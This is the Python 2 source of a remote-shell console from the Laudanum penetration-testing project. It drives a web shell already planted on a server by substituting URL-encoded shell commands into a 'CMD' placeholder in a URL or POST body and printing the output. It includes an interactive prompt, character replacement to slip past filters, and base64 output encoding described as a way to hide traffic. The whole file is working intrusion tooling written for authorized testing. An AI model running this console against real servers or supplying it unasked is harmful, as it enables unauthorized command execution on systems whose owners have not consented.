#!/usr/bin/env python

'''
*******************************************************************************
***
*** Laudanum Project
*** A Collection of Injectable Files used during a Penetration Test
***
*** More information is available at:
***  http://laudanum.professionallyevil.com/
***  laudanum@secureideas.net
***
***  Project Leads:
***         Kevin Johnson @secureideas <kjohnson@secureideas.com>
***         Tim Medin @timmedin <tim@securitywhole.com>
***         John Sawyer @johnhsawyer <john@inguardians.com>
***
*** Copyright 2015 by The Laudanum Team
***
********************************************************************************
***
*** This file provides a console for working with remote shells.
*** //TODO: Add the ability to strip out extra text so only shell output is shown
*** Written by Tim Medin <tim@securitywhole.com>
***
********************************************************************************
*** This program is free software; you can redistribute it and/or
*** modify it under the terms of the GNU General Public License
*** as published by the Free Software Foundation; either version 2
*** of the License, or (at your option) any later version.
***
*** This program is distributed in the hope that it will be useful,
*** but WITHOUT ANY WARRANTY; without even the implied warranty of
*** MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
*** GNU General Public License for more details.
***
*** You can get a copy of the GNU General Public License from this
*** address: http://www.gnu.org/copyleft/gpl.html#SEC1
*** You can also write to the Free Software Foundation, Inc., Temple
*** Place - Suite  Boston, MA   USA.
***
***************************************************************************** */
'''

import urllib2
import urllib
import base64
import re

origurl = None
origdata = None
replace = []
usebase64 = False

def sendrequest(url, data=None):
	if data != None:
		resp = urllib2.urlopen(url, data)
	else:
		resp = urllib2.urlopen(url)

	html = resp.read()
	resp.close()

	if usebase64:
		matches = re.findall('[A-Za-z0-9/+]+={0,2}', html)
		for m in matches:
			print base64.b64decode(m)
	else:
		print html

	# TODO: update this to allow filtering before and after the command
	

def preparecmd(cmd):
	global replace
	global usebase64

	for r in replace:
		cmd = cmd.replace(r[0], r[1])
	if usebase64:
		cmd += ' | base64 -w 0'
	cmd = urllib.quote(cmd)
	return cmd


def dointeract():
	global origurl
	print "Type the commands to run on the remote server"
	while True:
		cmd = raw_input('> ')
		if cmd in ['stop', 'quit', 'exit']:
			break
		cmd = preparecmd(cmd)
		url = origurl.replace('CMD', cmd)
		data = origdata.replace('CMD', cmd)
		sendrequest(url, data)

def main():
	global origurl
	global replace
	global usebase64
	global origdata

	import argparse
	parser = argparse.ArgumentParser(description='Easy remote shell.')
	parser.add_argument('-i', '--interactive', help='interactive', dest='interactive', action='store_true', default=False)
	parser.add_argument('-u', '--url', required=True, help='The url', metavar='URL', dest='url')
	parser.add_argument('-d', '--data', help='data to send via post', metavar='DATA', dest='data')
	parser.add_argument('-c', '--cmd', help='The command to execute (use ++ instead of - unless other override is defined)', metavar='COMMAND', dest='cmd', nargs='+')
	parser.add_argument('-r', '--replace', nargs=2, action='append', help='Characters to replace', dest='replace')
	# not encryption, don't pretend it is or use it thusly
	parser.add_argument('-b', '--base64', help='Attempt to hide with base64 encoded (*Nix Only(', dest='base64', action='store_true', default=False)
	args = parser.parse_args()
	origurl = args.url
	origdata = args.data if args.data else ''
	replace = args.replace if args.replace else []
	usebase64 = args.base64

	if not args.interactive and args.cmd == None:
		parser.print_help()
		print 'argument -c/--cmd or -i/--interactive are required'
		exit(0)

	if args.cmd:
		#check for the default overrite 
		if replace and [r[1] for r in replace  if r[1]=='-']:
			print 'override of - found, ignoring ++'
		else:
			replace.append(['++', '-'])

		cmd = preparecmd(' '.join(args.cmd))
		url = origurl.replace('CMD', cmd)
		data = origdata.replace('CMD', cmd)
			
		sendrequest(url, data)

	if args.interactive:
		try:
			import readline
		except:
			pass
		dointeract()

if __name__ == '__main__':
	main()